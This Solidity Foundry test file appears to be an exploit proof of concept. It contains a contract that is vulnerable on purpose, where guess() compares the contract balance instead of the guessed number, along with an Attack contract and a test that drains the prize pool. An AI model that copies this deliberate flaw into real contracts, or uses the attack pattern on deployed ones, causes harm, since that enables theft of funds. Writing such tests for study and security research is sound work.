// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contracts. In a real project, you would import these from a separate file. 
// For demonstration we include the contracts inline.

contract GuessTheNumber {
    uint private _secretNumber; // secretly set during construction
    event success(string message);
    event wrongNumber(string message);

    // Constructor sets the secret number
    constructor(uint secretNumber) {
        _secretNumber = secretNumber;
    }

    // Accept Ether to fund the prize pool
    receive() external payable {}

    // Vulnerable function: wrong ordering of arguments due to simulated control characters effect
    function guess(uint n) payable public {
        require(msg.value == 1 ether, "Require exactly 1 ether");
        uint p = address(this).balance;
        // Vulnerability: should call checkAndTransferPrize(p, n, msg.sender) but instead passes (p, p, msg.sender)
        checkAndTransferPrize(p, p, payable(msg.sender));
    }

    // Internal function that checks the guessed number and transfers the prize if successful
    function checkAndTransferPrize(uint p, uint n, address payable guesser) internal returns (bool) {
        if(n == _secretNumber) {
            guesser.transfer(p);
            emit success("You guessed the correct number!");
            return true;
        } else {
            emit wrongNumber("Youve made an incorrect guess!");
            return false;
        }
    }
}

// Attack contract that exploits the vulnerability
contract Attack {
    GuessTheNumber public target;
    event AttackResult(bool success);

    // The constructor accepts the target address
    constructor(address payable _target) {
        target = GuessTheNumber(_target);
    }

    // Attack function: sends 1 ether to trigger the vulnerability
    function attack() external payable {
        require(msg.value == 1 ether, "Need to send 1 ether for the attack");
        // The value passed here does not matter; vulnerability causes (p, p, msg.sender) to be used
        target.guess{value: 1 ether}(123);
        emit AttackResult(true);
    }

    // Allow the contract to receive Ether
    receive() external payable {}
}


contract VulnerabilityTest is Test {
    GuessTheNumber public target;
    Attack public attackerContract;
    address payable attackerEOA = payable(address(0xBEEF));

    // setUp is run before each test
    function setUp() public {
        // Set an initial balance for the attacker account
        vm.deal(attackerEOA, 10 ether);

        /*
         We want to set the condition for the vulnerability:
         The vulnerable logic compares the contract's balance (p) with _secretNumber.
         In our guess() function, p is the balance after receiving 1 ether in the call.
         Hence, if we fund the contract with 1 ether beforehand and deploy it with secretNumber = 2 ether,
         then during the guess call, p becomes 2 ether (1 ether initial + 1 ether from the guess call) and match _secretNumber.
        */

        // Deploy target contract with secret number set to 2 ether
        target = new GuessTheNumber(2 ether);

        // Fund the target contract with 1 ether by sending directly to its receive() function
        (bool sent, ) = payable(address(target)).call{value: 1 ether}("");
        require(sent, "Funding target failed");

        // Deploy the attacker contract using attackerEOA, so that msg.sender in the attack will be the attacker contract
        vm.prank(attackerEOA);
        attackerContract = new Attack(payable(address(target)));
    }

    function testAttackExploit() public {
        // Before the attack, target's balance should be 1 ether
        assertEq(address(target).balance, 1 ether, "Target balance should be 1 ether before attack");

        // Execute the attack from attackerEOA. The attack() function sends 1 ether along with the call.
        vm.prank(attackerEOA);
        attackerContract.attack{value: 1 ether}();

        // After attack, the target contract should have transferred all funds to the attacker contract
        assertEq(address(target).balance, 0, "Target balance should be 0 after attack");

        // The attacker contract should have received the total prize of 2 ether (initial 1 ether funding + 1 ether attack call)
        assertEq(address(attackerContract).balance, 2 ether, "Attacker contract should have 2 ether after attack");
    }

    // Optional: test that guess reverts when wrong value is sent
    function testGuessWithWrongEther() public {
        // Expect revert when not sending exactly 1 ether
        vm.expectRevert("Require exactly 1 ether");
        target.guess{value: 0.5 ether}(123);
    }
}
